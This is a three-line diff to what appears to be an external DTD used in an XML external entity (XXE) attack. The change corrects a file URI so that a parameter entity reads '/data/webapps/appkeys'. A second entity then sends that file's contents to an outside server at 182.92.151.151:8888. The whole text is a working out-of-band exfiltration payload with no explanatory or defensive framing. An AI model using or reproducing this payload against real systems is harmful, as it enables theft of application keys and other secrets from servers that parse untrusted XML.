@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file://data/webapps/appkeys">
+<!ENTITY % file SYSTEM "file:///data/webapps/appkeys">
 <!ENTITY % define_http "<!ENTITY &#37; send_http SYSTEM 'http://182.92.151.151:8888/%file;'>">
 
